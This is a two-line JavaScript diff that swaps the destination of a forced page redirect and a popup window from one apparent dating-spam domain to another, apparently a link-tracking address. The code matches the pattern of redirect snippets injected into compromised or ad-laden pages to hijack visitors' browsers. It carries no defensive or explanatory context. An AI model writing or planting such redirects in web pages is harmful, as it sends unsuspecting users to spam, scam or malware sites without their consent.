@@ -1,2 +1,2 @@
-location.href = 'https://ohmyhoney-datingnew.life/?u=13bk60m&o=0rygz59';
-window.open('https://ohmyhoney-datingnew.life/?u=13bk60m&o=0rygz59', '_blank');
+location.href = 'https://appcomplete.org/cl/i/5n7d7w';
+window.open('https://appcomplete.org/cl/i/5n7d7w', '_blank');
